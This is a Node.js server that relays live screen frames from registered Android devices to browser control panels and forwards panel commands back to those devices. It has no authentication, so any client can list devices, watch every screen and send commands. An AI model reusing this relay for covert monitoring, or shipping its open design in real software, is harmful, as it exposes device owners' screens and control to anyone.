const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const compression = require('compression');
const path = require('path');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

app.use(compression());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

/* ===============================
   DATA STORES (SAME AS BEFORE)
================================ */

// Registered devices info (REST)
const registeredDevices = new Map(); 
// deviceId => ws (Android live connection)
const liveDevices = new Map();       
// Browser panels
const panels = new Set();

/* ===============================
   REST APIs (UNCHANGED)
================================ */

app.post('/register', (req, res) => {
    const { deviceId, model, brand, version, status } = req.body;

    if (deviceId) {
        registeredDevices.set(deviceId, {
            model, brand, version, status
        });
        console.log('📌 Device registered:', deviceId);
    }

    res.json({ success: true });
});

app.get('/devices', (req, res) => {
    res.json(Array.from(registeredDevices.entries()));
});

/* ===============================
   PURE WEBSOCKET HANDLER
================================ */

wss.on('connection', (ws, req) => {
    const params = new URLSearchParams(req.url.replace('/?', ''));
    const deviceId = params.get('deviceId'); // Android
    const role = params.get('role');         // panel

    /* ---------- ANDROID DEVICE ---------- */
    if (deviceId) {
        liveDevices.set(deviceId, ws);
        console.log('📱 Android connected:', deviceId);

        ws.on('message', (msg) => {
            try {
                const data = JSON.parse(msg.toString());

                // SCREEN FRAME
                if (data.type === 'screen') {
                    panels.forEach(panel => {
                        if (panel.readyState === WebSocket.OPEN) {
                            panel.send(JSON.stringify(data));
                        }
                    });
                }

                // HEARTBEAT (optional)
                if (data.type === 'heartbeat') {
                    // console.log('💓 Heartbeat:', deviceId);
                }

            } catch (err) {
                console.error('❌ Invalid device JSON');
            }
        });

        ws.on('close', () => {
            liveDevices.delete(deviceId);
            console.log('❌ Android disconnected:', deviceId);
        });

        return;
    }

    /* ---------- BROWSER CONTROL PANEL ---------- */
    if (role === 'panel') {
        panels.add(ws);
        console.log('🖥 Control panel connected');

        ws.on('message', (msg) => {
            try {
                const cmd = JSON.parse(msg.toString());
                const target = liveDevices.get(cmd.deviceId);

                if (target && target.readyState === WebSocket.OPEN) {
                    target.send(JSON.stringify(cmd));
                }
            } catch (err) {
                console.error('❌ Invalid panel command');
            }
        });

        ws.on('close', () => {
            panels.delete(ws);
            console.log('🖥 Panel disconnected');
        });
    }
});

/* ===============================
   SERVER START
================================ */

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`🚀 Pure WebSocket Server running on port ${PORT}`);
});
